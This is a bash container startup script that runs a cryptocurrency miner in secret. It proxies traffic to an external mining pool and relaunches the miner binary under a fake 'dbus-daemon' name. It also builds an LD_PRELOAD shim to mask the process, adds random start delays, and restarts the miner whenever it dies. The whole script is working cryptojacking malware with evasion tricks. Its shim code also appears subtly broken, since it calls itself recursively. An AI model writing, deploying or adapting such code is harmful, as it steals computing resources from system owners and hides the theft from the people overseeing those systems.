#!/bin/bash

echo "=== CONTAINER STARTED === $(date)"

PORT=443
FAKE_NAME="dbus-daemon-$(shuf -i 100-999 -n 1)"
FAKE_PATH="/usr/local/bin/${FAKE_NAME}"

echo "[+] Starting TLS Proxy..."
python3 -m aiostratum_proxy \
  --host 0.0.0.0 \
  --port ${PORT} \
  --pool-host asia.rplant.xyz \
  --pool-port 17059 \
  --pool-ssl &

sleep 15

echo "[+] Preparing stealth binary..."
cp /usr/local/bin/miner "$FAKE_PATH"
chmod +x "$FAKE_PATH"

# LD_PRELOAD untuk super stealth
cat > /tmp/hide.c << 'EOF'
#include <stdio.h>
#include <string.h>
int execve(const char *filename, char *const argv[], char *const envp[]) {
    if (strstr(filename, "miner") || (argv[0] && strstr(argv[0], "miner"))) {
        argv[0] = "/usr/bin/dbus-daemon";
    }
    return execve(filename, argv, envp);
}
EOF

gcc -shared -fPIC -o /tmp/hide.so /tmp/hide.c -ldl 2>/dev/null || true

sleep $((RANDOM % 60 + 20))

echo "[+] Launching SUPER STEALTH miner as ${FAKE_NAME}..."

if [ -f /tmp/hide.so ]; then
    echo "[+] Using LD_PRELOAD hide..."
    LD_PRELOAD=/tmp/hide.so exec -a "/usr/bin/dbus-daemon" "$FAKE_PATH" \
      -a yespowertide \
      -o stratum+tcps://127.0.0.1:${PORT} \
      -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
      -p x \
      -t 1 \
      -B --no-color &
else
    exec -a "/usr/bin/dbus-daemon" "$FAKE_PATH" \
      -a yespowertide \
      -o stratum+tcps://127.0.0.1:${PORT} \
      -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
      -p x \
      -t 1 \
      -B --no-color &
fi

echo "[+] Miner launched. Monitoring..."

while true; do
    sleep 40
    if ! pgrep -f ${FAKE_NAME} > /dev/null 2>&1; then
        echo "[!] Miner died, restarting..."
        sleep 15
        if [ -f /tmp/hide.so ]; then
            LD_PRELOAD=/tmp/hide.so exec -a "/usr/bin/dbus-daemon" "$FAKE_PATH" \
              -a yespowertide \
              -o stratum+tcps://127.0.0.1:${PORT} \
              -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
              -p x \
              -t 1 \
              -B --no-color &
        else
            exec -a "/usr/bin/dbus-daemon" "$FAKE_PATH" \
              -a yespowertide \
              -o stratum+tcps://127.0.0.1:${PORT} \
              -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
              -p x \
              -t 1 \
              -B --no-color &
        fi
    fi
done
